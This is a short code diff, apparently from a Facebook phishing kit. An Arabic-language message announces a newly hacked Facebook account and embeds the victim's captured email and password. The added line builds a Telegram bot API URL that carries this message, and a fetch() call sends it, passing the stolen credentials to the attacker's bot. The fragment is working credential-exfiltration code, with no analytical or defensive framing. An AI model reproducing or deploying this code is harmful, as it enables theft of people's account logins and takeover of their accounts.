@@ -94,6 +94,7 @@
 
     const message = `📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
 
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
       .then(response => response.json())
